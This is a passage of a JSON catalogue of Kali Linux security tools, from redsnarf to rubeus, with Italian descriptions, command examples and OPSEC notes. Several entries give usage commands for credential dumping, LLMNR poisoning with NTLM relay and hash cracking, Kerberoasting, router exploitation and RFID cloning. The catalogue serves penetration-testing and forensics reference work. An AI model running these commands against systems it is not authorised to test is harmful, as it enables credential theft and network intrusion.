    "name": "redsnarf",
    "version": "0~git20170822",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/redsnarf/",
    "desc": "Recupera credenziali Windows da host remoti: SAM, LSA secrets, cached credentials.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RedSnarf</strong> è un tool di credential harvesting che recupera hash e secrets da sistemi Windows remoti. Supporta dump di SAM, LSA secrets, cached credentials e può eseguire pass-the-hash automaticamente per lateral movement.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SAM Dump:</strong> estrae hash dal Security Account Manager</p><p><strong>LSA Secrets:</strong> recupera secrets LSA incluse password servizi</p><p><strong>Cached Creds:</strong> estrae credenziali cached di login dominio</p><p><strong>Pass-the-Hash:</strong> autenticazione automatica con hash recuperati</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dump credenziali con password\npython redsnarf.py -H 192.168.1.100 -u admin -p password -d domain\n\n# Con hash NTLM\npython redsnarf.py -H 192.168.1.100 -u admin -hh aad3b435b51404ee:hash\n\n# Dump LSA secrets\npython redsnarf.py -H 192.168.1.100 -u admin -p pass -rL</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>credential harvesting</strong>, raccolta hash da sistemi compromessi. Per <strong>lateral movement</strong>, PTH automatico su target multipli. Per <strong>domain compromise</strong>, escalation da local admin a domain admin.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Admin required:</strong> richiede privilegi amministrativi sul target. <strong>Detection:</strong> dump SAM/LSA rilevato da EDR. <strong>Logging:</strong> accesso remoto loggato su target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "redsocks",
    "name": "redsocks",
    "version": "0.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/redsocks/",
    "desc": "Redirector TCP trasparente per forzare traffico attraverso proxy SOCKS4/5.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Redsocks</strong> è un redirector TCP trasparente che forza connessioni attraverso proxy SOCKS4/5 o HTTP CONNECT usando iptables. A differenza di proxychains, funziona a livello di sistema operativo senza modifiche alle applicazioni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Transparent Proxy:</strong> redirect automatico via iptables</p><p><strong>Multi-proxy:</strong> supporto SOCKS4, SOCKS5, HTTP CONNECT</p><p><strong>System-wide:</strong> funziona per tutte le applicazioni</p><p><strong>Authentication:</strong> supporto autenticazione proxy</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Configurazione /etc/redsocks.conf\nredsocks {\n    local_ip = 127.0.0.1;\n    local_port = 12345;\n    ip = proxy_ip;\n    port = 1080;\n    type = socks5;\n}\n\n# Avvio redsocks\nredsocks -c /etc/redsocks.conf\n\n# Iptables redirect\niptables -t nat -A OUTPUT -p tcp -j REDIRECT --to-port 12345</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>pivoting</strong>, routing trasparente attraverso tunnel. Per <strong>anonymization</strong>, forzare tutto il traffico via Tor. Per <strong>network isolation</strong>, controllare traffico outbound.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>System-wide:</strong> impatta tutto il traffico TCP. <strong>UDP:</strong> non supporta UDP. <strong>Configuration:</strong> richiede setup iptables attento.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "regripper",
    "name": "regripper",
    "version": "3.0~git20221205.d588019",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/regripper/",
    "desc": "Estrae informazioni forensi da registry Windows: utenti, software, timeline eventi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RegRipper</strong> è un tool di forensics per estrarre e analizzare informazioni dal registry Windows. Utilizza plugin Perl per parsare hive di registro ed estrarre dati su utenti, software installato, programmi eseguiti, USB collegati e molto altro.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Plugin Architecture:</strong> oltre 200 plugin per diversi artefatti</p><p><strong>All Hives:</strong> supporta SAM, SYSTEM, SOFTWARE, NTUSER, UsrClass</p><p><strong>Timeline:</strong> estrae timestamp per ricostruzione eventi</p><p><strong>Artifact Extraction:</strong> MRU, shellbags, UserAssist, services</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analisi hive NTUSER.DAT\nrip.pl -r NTUSER.DAT -f ntuser\n\n# Hive SYSTEM con plugin specifico\nrip.pl -r SYSTEM -p services\n\n# Lista plugin disponibili\nrip.pl -l\n\n# Output su file\nrip.pl -r SOFTWARE -f software > software_analysis.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>DFIR</strong>, analisi registry durante incident response. Per <strong>malware analysis</strong>, identificazione persistence mechanisms. Per <strong>investigation</strong>, ricostruzione attività utente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Offline:</strong> analizza hive exportati, non sistema live. <strong>Completeness:</strong> coverage dipende dai plugin disponibili. <strong>Updates:</strong> plugin richiedono aggiornamenti per nuovi artefatti.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "responder",
    "name": "responder",
    "version": "3.1.7.0",
    "icon": "../app/icons/responder-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/responder/",
    "desc": "Poisoner LLMNR/NBT-NS/mDNS per cattura hash NTLMv1/v2 su reti Windows locali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Responder</strong> è un poisoner per protocolli di name resolution Windows (LLMNR, NBT-NS, mDNS). Cattura hash NTLMv1/v2 rispondendo a richieste di risoluzione nomi, permettendo crack offline o relay per accesso a risorse.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>LLMNR/NBT-NS Poisoning:</strong> risponde a query di risoluzione fallite</p><p><strong>Hash Capture:</strong> cattura hash NTLMv1, NTLMv2, NTLMv2-SSP</p><p><strong>Rogue Servers:</strong> SMB, HTTP, FTP, LDAP, SQL server fake</p><p><strong>WPAD Poisoning:</strong> cattura credenziali proxy</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Poisoning completo con WPAD e SMB\nresponder -I eth0 -wrf -P\n\n# Modalità analisi (passive, no poisoning)\nresponder -I eth0 -A -v\n\n# Con ntlmrelayx per relay attack (no SMB/HTTP locali)\nresponder -I eth0 -r -d -w  # disabilita SMB/HTTP\nntlmrelayx.py -t smb://dc.target.com -smb2support\n\n# Targeting specifico con filtering\nresponder -I eth0 --lm --disable-ess\n\n# Combo con MultiRelay per shell\npython MultiRelay.py -t 192.168.1.0/24 -u ALL\nresponder -I eth0 -rv\n\n# DHCP poisoning per WPAD injection\nresponder -I eth0 -D --wpad --wredir\n\n# Cracking hash catturati\ncat /usr/share/responder/logs/*.txt | grep NTLMv2 | cut -d: -f1-6 &gt; hashes.txt\nhashcat -m 5600 hashes.txt wordlist.txt\n\n# IPv6 mode per DHCPv6 poisoning\nresponder -I eth0 -6</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>credential harvesting</strong>, cattura hash su reti Windows. Per <strong>relay attacks</strong>, hash per ntlmrelayx a target vulnerabili. Per <strong>initial access</strong>, cracking hash per password in chiaro.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Noisy:</strong> risposte a broadcast facilmente rilevabili. <strong>Detection:</strong> SIEM moderni rilevano poisoning. <strong>Network:</strong> richiede presenza sulla stessa rete/VLAN.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "rev-proxy-grapher",
    "name": "rev-proxy-grapher",
    "version": "0~git20180301",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rev-proxy-grapher/",
    "desc": "Visualizza catena reverse proxy tra client e server per mappare infrastruttura web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>rev-proxy-grapher</strong> analizza header HTTP per identificare e visualizzare la catena di reverse proxy tra client e server backend. Utile per mappare infrastruttura web nascosta dietro CDN, WAF e load balancer.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Header Analysis:</strong> parsing di Via, X-Forwarded-For, X-Real-IP</p><p><strong>Chain Visualization:</strong> grafico della catena proxy</p><p><strong>Technology Detection:</strong> identifica tipo di proxy (nginx, Apache, CDN)</p><p><strong>Backend Discovery:</strong> rivela IP e hostname backend</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analisi URL target\nrev-proxy-grapher http://target.com\n\n# Con output grafico\nrev-proxy-grapher http://target.com -o graph.png\n\n# Verboso per debug\nrev-proxy-grapher http://target.com -v</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>recon</strong>, mappatura infrastruttura web target. Per <strong>WAF bypass</strong>, identificazione endpoint dietro protezioni. Per <strong>pentest</strong>, comprensione architettura prima di attacco.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passive:</strong> analisi basata su header di risposta. <strong>Limitations:</strong> proxy ben configurati non espongono header. <strong>CDN:</strong> può rivelare IP origin server.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "rfcat",
    "name": "rfcat",
    "version": "2.0.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rfcat/",
    "desc": "Framework per hacking RF con RfCat dongle: sniffing, replay, jam su frequenze sub-GHz.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RfCat</strong> è un framework Python per hacking su frequenze radio sub-GHz usando hardware RfCat/YARD Stick One. Permette sniffing, trasmissione, replay attacks su dispositivi wireless come telecomandi, sensori IoT, sistemi di allarme.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Frequency Range:</strong> 300-928 MHz copertura sub-GHz</p><p><strong>Sniffing:</strong> cattura segnali RF per analisi</p><p><strong>Replay:</strong> ritrasmissione segnali catturati</p><p><strong>Python API:</strong> scriptabile per attacchi automatizzati</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Shell interattiva rfcat\nrfcat -r\n\n# Configurazione frequenza\nd.setFreq(433920000)  # 433.92 MHz\n\n# Sniffing\nd.RFrecv()\n\n# Trasmissione\nd.RFxmit(data)</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>IoT security</strong>, test sicurezza dispositivi wireless. Per <strong>physical pentest</strong>, attacco a sistemi di controllo accessi. Per <strong>research</strong>, analisi protocolli RF proprietari.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legal:</strong> trasmissione RF non autorizzata è illegale. <strong>Hardware:</strong> richiede dongle YARD Stick One o compatibile. <strong>Range:</strong> trasmissione limitata dalla potenza del dispositivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "RFID_NFC"
    ],
    "notes": null
  },
  {
    "id": "rfdump",
    "name": "rfdump",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rfdump/",
    "desc": "Legge e scrive tag RFID ISO 15693 per clonazione e analisi di card contactless.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RFDump</strong> è un tool per lettura e scrittura di tag RFID conformi allo standard ISO 15693. Permette di analizzare, clonare e modificare card contactless ad alta frequenza (13.56 MHz) utilizzate in sistemi di accesso e identificazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>ISO 15693:</strong> supporto completo per standard vicinity cards</p><p><strong>Read/Write:</strong> lettura e scrittura memoria tag</p><p><strong>UID Discovery:</strong> identificazione unique identifier</p><p><strong>Block Operations:</strong> accesso a singoli blocchi memoria</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Lettura tag ISO 15693\nrfdump -r\n\n# Dump completo memoria\nrfdump -d -o dump.bin\n\n# Scrittura dati\nrfdump -w -i data.bin\n\n# Info tag\nrfdump -i</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>RFID security</strong>, analisi card di accesso. Per <strong>cloning</strong>, duplicazione tag per test. Per <strong>research</strong>, studio implementazioni ISO 15693.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Hardware:</strong> richiede reader RFID compatibile. <strong>Legal:</strong> clonazione card senza autorizzazione è illegale. <strong>Standard:</strong> funziona solo con ISO 15693, non altri standard.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "RFID_NFC"
    ],
    "notes": null
  },
  {
    "id": "ridenum",
    "name": "ridenum",
    "version": "1.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ridenum/",
    "desc": "Enumera utenti Windows tramite RID cycling su sessioni SMB null session.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RidEnum</strong> enumera utenti Windows attraverso la tecnica RID cycling su sessioni SMB. Sfruttando null session o credenziali guest, itera attraverso RID (Relative Identifiers) per scoprire username validi sul sistema target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>RID Cycling:</strong> brute force di RID per trovare utenti</p><p><strong>Null Session:</strong> funziona senza credenziali se permesso</p><p><strong>Range Configurable:</strong> definizione range RID da testare</p><p><strong>SID Discovery:</strong> identifica SID del dominio/sistema</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumeration con null session\nridenum.py target_ip 500 50000\n\n# Con credenziali\nridenum.py target_ip 500 50000 -u user -p pass\n\n# Range RID specifico\nridenum.py target_ip 1000 2000</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>user enumeration</strong>, discovery utenti su sistemi Windows. Per <strong>AD recon</strong>, identificazione account prima di password attacks. Per <strong>pentest</strong>, mappatura utenti target.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Null session:</strong> molti sistemi moderni bloccano null session. <strong>Logging:</strong> tentativi SMB loggati sul target. <strong>Rate:</strong> enumeration intensiva genera molto traffico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "rizin-cutter",
    "name": "rizin-cutter",
    "version": "2.4.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rizin-cutter/",
    "desc": "GUI per Rizin/Ghidra: reverse engineering con graph, decompiler, hex editor integrato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Cutter</strong> (Rizin-Cutter) è l'interfaccia grafica ufficiale per Rizin, con integrazione del decompiler Ghidra. Offre graph view delle funzioni, hex editor, debugger visuale e tutte le funzionalità di reverse engineering in un ambiente user-friendly.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Graph View:</strong> visualizzazione control flow graph delle funzioni</p><p><strong>Ghidra Decompiler:</strong> decompilazione in pseudo-C integrata</p><p><strong>Hex Editor:</strong> modifica binari con view sincronizzata</p><p><strong>Debugger:</strong> debugging integrato con breakpoint e stepping</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio GUI\ncutter\n\n# Apertura binario\n# File -> Open -> seleziona binario\n\n# Analisi automatica all'apertura\n# Graph view con doppio click su funzione\n# Decompilazione nel pannello destro</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>malware analysis</strong>, analisi visuale di sample con decompilazione. Per <strong>CTF</strong>, reversing con interfaccia intuitiva. Per <strong>learning</strong>, apprendimento RE con visualizzazione chiara.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Risorse:</strong> analisi grandi binari richiede RAM significativa. <strong>Decompiler:</strong> output pseudo-C non sempre accurato. <strong>Alternative:</strong> IDA Pro, Ghidra standalone per funzionalità avanzate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "rizin",
    "name": "rizin",
    "version": "0.8.1",
    "icon": "../app/icons/rizin-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rizin/",
    "desc": "Fork moderno di Radare2 per analisi binaria, disassembly e reverse engineering.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Rizin</strong> è un fork di Radare2 focalizzato su usabilità e API stabili. Fornisce disassembler, debugger, analizzatore binario con sintassi comandi semplificata e migliore documentazione. Mantiene compatibilità con l'ecosistema r2.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Clean API:</strong> interfaccia più consistente rispetto a Radare2</p><p><strong>Multi-arch:</strong> supporto architetture x86, ARM, MIPS e altre</p><p><strong>Plugin System:</strong> estensibile con plugin C e scripting</p><p><strong>Cutter Integration:</strong> GUI ufficiale disponibile separatamente</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Apertura binario\nrizin binary\n\n# Analisi automatica\naaa\n\n# Lista funzioni\nafl\n\n# Disassembly funzione\npdf @main\n\n# Help comandi\n?</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>reverse engineering</strong>, alternativa moderna a Radare2. Per <strong>binary analysis</strong>, ispezione eseguibili con API pulita. Per <strong>automation</strong>, scripting analisi con rz-pipe.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Learning:</strong> curva apprendimento meno ripida di r2. <strong>Compatibilità:</strong> alcuni plugin r2 potrebbero non funzionare. <strong>Development:</strong> progetto in sviluppo attivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "ropper",
    "name": "ropper",
    "version": "1.13.8",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ropper/",
    "desc": "Cerca ROP gadgets in binari PE/ELF/Mach-O per exploit development e bypass DEP/ASLR.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ropper</strong> cerca gadget ROP (Return-Oriented Programming) in binari per costruire catene di exploit che bypassano DEP e ASLR. Supporta formati PE, ELF e Mach-O con ricerca semantica di gadget specifici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Gadget Search:</strong> trova sequenze utili terminanti in ret/jmp/call</p><p><strong>Semantic Search:</strong> cerca gadget per funzionalità specifica</p><p><strong>Chain Builder:</strong> aiuta costruzione catene ROP</p><p><strong>Multi-format:</strong> PE, ELF, Mach-O, raw binary</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca tutti i gadget\nropper -f binary\n\n# Cerca gadget specifici\nropper -f binary --search \"pop rdi\"\n\n# Solo gadget JOP\nropper -f binary --type jop\n\n# Genera chain per execve\nropper -f binary --chain execve</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>exploit development</strong>, costruzione payload ROP per buffer overflow. Per <strong>CTF</strong>, challenge pwn con protezioni attive. Per <strong>research</strong>, analisi gadget disponibili in librerie.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Complexity:</strong> ROP richiede comprensione profonda architettura. <strong>ASLR:</strong> leak address necessario per catene funzionanti. <strong>Alternatives:</strong> ROPgadget, one_gadget per usi specifici.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "routerkeygenpc",
    "name": "routerkeygenpc",
    "version": "1.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/routerkeygenpc/",
    "desc": "Genera password WiFi di default per router comuni basate su SSID e BSSID.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RouterKeygenPC</strong> genera password WiFi di default per router comuni calcolandole da SSID e BSSID. Sfrutta algoritmi noti usati da produttori come Thomson, Huawei, Pirelli per generare password factory prevedibili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Algorithm Database:</strong> algoritmi per decine di produttori</p><p><strong>SSID/BSSID Based:</strong> calcola password da identificatori rete</p><p><strong>Offline:</strong> non richiede connessione internet</p><p><strong>Multi-vendor:</strong> Thomson, Huawei, O2, Verizon e altri</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio interfaccia\nrouterkeygenpc\n\n# Input SSID e BSSID dalla scansione WiFi\n# Tool calcola possibili password default\n# Test manuale delle password generate</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi pentesting</strong>, recupero password factory non cambiate. Per <strong>security audit</strong>, verifica che password default siano state modificate. Per <strong>password recovery</strong>, accesso a propria rete dimenticata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Efficacia:</strong> funziona solo se utente non ha cambiato password. <strong>Legal:</strong> uso su reti altrui è illegale. <strong>Outdated:</strong> algoritmi nuovi potrebbero non essere supportati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "routersploit",
    "name": "routersploit",
    "version": "3.4.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/routersploit/",
    "desc": "Framework exploitation per router, IoT e dispositivi embedded con moduli automatici.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RouterSploit</strong> è un framework di exploitation stile Metasploit specifico per router, IoT e dispositivi embedded. Include moduli per exploit noti, scanner di vulnerabilità, credential testing e post-exploitation su dispositivi di rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Exploit Modules:</strong> centinaia di exploit per router e IoT</p><p><strong>Scanner:</strong> vulnerability scanner per dispositivi di rete</p><p><strong>Creds:</strong> moduli per default credentials testing</p><p><strong>Post-exploitation:</strong> moduli per estrazione config e backdoor</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio framework\nrsf\n\n# Uso scanner\nuse scanners/autopwn\nset target 192.168.1.1\nrun\n\n# Exploit specifico\nuse exploits/routers/dlink/dir_300_615_auth_bypass\nset target 192.168.1.1\ncheck\nrun</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>IoT pentesting</strong>, assessment sicurezza dispositivi embedded. Per <strong>network audit</strong>, verifica router aziendali. Per <strong>research</strong>, sviluppo nuovi exploit per dispositivi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signatures:</strong> exploit noti, possono essere loggati. <strong>Damage:</strong> alcuni exploit possono crashare dispositivi. <strong>Updates:</strong> database exploit richiede aggiornamenti.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "IoT"
    ],
    "notes": null
  },
  {
    "id": "rsakeyfind",
    "name": "rsakeyfind",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rsakeyfind/",
    "desc": "Cerca chiavi private RSA in memory dump e immagini disco per forensics.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RSAKeyFind</strong> cerca chiavi private RSA in memory dump, immagini disco o file raw. Identifica strutture matematiche caratteristiche delle chiavi RSA (modulo, esponenti) permettendo recovery di chiavi usate per cifratura.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Pattern Search:</strong> identifica strutture chiavi RSA in dati raw</p><p><strong>Memory Analysis:</strong> estrae chiavi da dump RAM</p><p><strong>Disk Forensics:</strong> cerca chiavi in immagini disco</p><p><strong>Multi-format:</strong> supporta vari formati chiave</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca in memory dump\nrsakeyfind memory.dump\n\n# Su immagine disco\nrsakeyfind disk.img\n\n# Su file raw\nrsakeyfind pagefile.sys</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>forensics</strong>, recovery chiavi crittografiche da sistemi compromessi. Per <strong>incident response</strong>, identificazione chiavi usate da malware. Per <strong>cold boot attacks</strong>, estrazione chiavi da RAM residua.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>False positives:</strong> può identificare pattern simili non-chiavi. <strong>Encryption:</strong> chiavi potrebbero essere cifrate a loro volta. <strong>Scope:</strong> solo RSA, non altri algoritmi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Memory_Analysis"
    ],
    "notes": null
  },
  {
    "id": "rsmangler",
    "name": "rsmangler",
    "version": "1.5",
    "icon": "../app/icons/rsmangler-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rsmangler/",
    "desc": "Genera wordlist personalizzate applicando trasformazioni comuni a parole base.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RSMangler</strong> genera wordlist personalizzate applicando trasformazioni comuni a parole base. Partendo da keyword target-specific, applica leetspeak, capitalizzazione, append numeri/simboli per creare dizionari ottimizzati per password attacks.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Transformations:</strong> leetspeak, caps, reverse, append</p><p><strong>Number Append:</strong> aggiunge anni, sequenze numeriche</p><p><strong>Symbol Inject:</strong> inserisce caratteri speciali comuni</p><p><strong>Combination:</strong> combina multiple trasformazioni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Da file di parole base\nrsmangler -f base_words.txt -o wordlist.txt\n\n# Con trasformazioni specifiche\nrsmangler -f words.txt --leet --years\n\n# Pipe da input\necho 'company' | rsmangler\n\n# Limita lunghezza output\nrsmangler -f words.txt --min 8 --max 16</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>targeted attacks</strong>, wordlist basate su informazioni target. Per <strong>password audit</strong>, test password policy aziendali. Per <strong>social engineering</strong>, password basate su info raccolte.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Size:</strong> output può crescere esponenzialmente. <strong>Efficiency:</strong> wordlist mirate più efficaci di brute force. <strong>OSINT:</strong> combinare con informazioni raccolte sul target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "rubeus",
    "name": "rubeus",
    "version": "1.6.4",
    "icon": "../app/icons/rubeus-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rubeus/",
    "desc": "Toolset Kerberos per attacchi AD: AS-REP roasting, S4U, delegation, golden ticket.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Rubeus</strong> è un toolset C# per attacchi Kerberos su Active Directory. Supporta AS-REP roasting, Kerberoasting, S4U abuse, constrained/unconstrained delegation, forging ticket (golden/silver) e molto altro. Tool essenziale per AD pentesting.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>AS-REP Roasting:</strong> estrae hash crackabili da account senza preauth</p><p><strong>Kerberoasting:</strong> richiede TGS per service account da crackare</p><p><strong>S4U Abuse:</strong> impersonation via delegation</p><p><strong>Ticket Forging:</strong> golden/silver ticket con chiavi compromesse</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Kerberoasting\nRubeus.exe kerberoast /outfile:hashes.txt\n\n# AS-REP roasting\nRubeus.exe asreproast\n\n# Request TGT\nRubeus.exe asktgt /user:admin /password:pass\n\n# S4U impersonation\nRubeus.exe s4u /user:svc /rc4:hash /impersonateuser:admin</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD exploitation</strong>, attacchi Kerberos completi. Per <strong>privilege escalation</strong>, abuse delegation per impersonation. Per <strong>persistence</strong>, golden ticket per accesso duraturo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> attività Kerberos anomala rilevabile da MDI. <strong>Logging:</strong> richieste ticket loggate su DC. <strong>EDR:</strong> Rubeus noto, detection signature alte.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "rz-ghidra",
    "name": "rz-ghidra",
    "version": "0.8.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rz-ghidra/",
